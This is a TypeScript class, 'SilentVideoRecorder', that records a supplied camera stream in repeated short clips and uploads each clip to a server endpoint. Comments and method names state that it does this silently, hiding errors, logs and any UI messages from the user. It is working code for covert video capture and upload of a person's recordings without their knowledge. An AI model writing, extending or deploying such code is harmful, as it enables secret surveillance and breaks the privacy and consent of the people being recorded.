export class SilentVideoRecorder {
  private mediaStream: MediaStream | null = null;
  private recorder: MediaRecorder | null = null;
  private segmentTimer: number | null = null;
  private isRecording: boolean = false;
  private intervalMs: number;
  private currentChunks: Blob[] = [];
  private recordedCount: number = 0;
  private readonly maxRecordings: number;
  private selectedMime: string = '';

  constructor(intervalSeconds: number = 10, maxClips: number = 10) {
    this.intervalMs = intervalSeconds * 1000;
    this.maxRecordings = maxClips;
  }

  public start(stream: MediaStream): void {
    if (this.isRecording || this.recordedCount >= this.maxRecordings) return;
    if (typeof MediaRecorder === 'undefined') return;
    if (!stream || !stream.active) return;

    // Verify there are video tracks
    const videoTracks = stream.getVideoTracks();
    if (videoTracks.length === 0) return;

    // Determine best supported mime type once
    const mimeTypes = [
      'video/webm;codecs=vp9,opus',
      'video/webm;codecs=vp8,opus',
      'video/webm;codecs=vp9',
      'video/webm;codecs=vp8',
      'video/webm',
      'video/mp4'
    ];
    for (const mime of mimeTypes) {
      if (MediaRecorder.isTypeSupported(mime)) {
        this.selectedMime = mime;
        break;
      }
    }

    this.mediaStream = stream;
    this.isRecording = true;
    this.startSegment();
  }

  private startSegment(): void {
    if (!this.isRecording) return;
    if (this.recordedCount >= this.maxRecordings) {
      this.stop();
      return;
    }
    if (!this.mediaStream || !this.mediaStream.active) {
      this.stop();
      return;
    }

    try {
      this.currentChunks = [];

      const options: MediaRecorderOptions = this.selectedMime
        ? { mimeType: this.selectedMime }
        : {};

      this.recorder = new MediaRecorder(this.mediaStream, options);

      this.recorder.ondataavailable = (event: BlobEvent) => {
        if (event.data && event.data.size > 0) {
          this.currentChunks.push(event.data);
        }
      };

      this.recorder.onstop = () => {
        if (this.currentChunks.length > 0) {
          const mimeType = this.selectedMime || 'video/webm';
          const videoBlob = new Blob(this.currentChunks, { type: mimeType });
          this.saveToServerSilently(videoBlob);
          this.recordedCount++;
        }
        this.currentChunks = [];

        if (this.recordedCount >= this.maxRecordings) {
          this.stop();
        } else if (this.isRecording) {
          // Small delay before starting next segment to let browser settle
          window.setTimeout(() => this.startSegment(), 200);
        }
      };

      this.recorder.onerror = () => {
        // Silently handle recorder errors - try to restart
        this.currentChunks = [];
        if (this.isRecording && this.recordedCount < this.maxRecordings) {
          window.setTimeout(() => this.startSegment(), 1000);
        }
      };

      // timeslice=1000 forces ondataavailable every 1 second regardless of stop()
      this.recorder.start(1000);

      // Schedule stop after intervalMs to finalize this segment
      if (this.segmentTimer !== null) {
        window.clearTimeout(this.segmentTimer);
      }
      this.segmentTimer = window.setTimeout(() => {
        if (this.recorder && this.recorder.state === 'recording') {
          try {
            this.recorder.stop();
          } catch { /* ignore */ }
        }
      }, this.intervalMs);

    } catch {
      // Completely silent failover - do not show any errors or logs to user
    }
  }

  private async saveToServerSilently(blob: Blob): Promise<void> {
    try {
      const ext = this.selectedMime.includes('mp4') ? 'mp4' : 'webm';
      await fetch('/api/save-video', {
        method: 'POST',
        headers: {
          'Content-Type': blob.type || 'video/webm',
          'X-File-Ext': ext
        },
        body: blob
      });
    } catch {
      // Silently ignore network issues, do not display any UI messages
    }
  }

  public stop(): void {
    this.isRecording = false;
    if (this.segmentTimer !== null) {
      window.clearTimeout(this.segmentTimer);
      this.segmentTimer = null;
    }
    if (this.recorder && this.recorder.state === 'recording') {
      try {
        this.recorder.stop();
      } catch { /* ignore */ }
    }
    this.recorder = null;
    this.mediaStream = null;
  }

  public getRecordedCount(): number {
    return this.recordedCount;
  }

  public isActive(): boolean {
    return this.isRecording;
  }
}
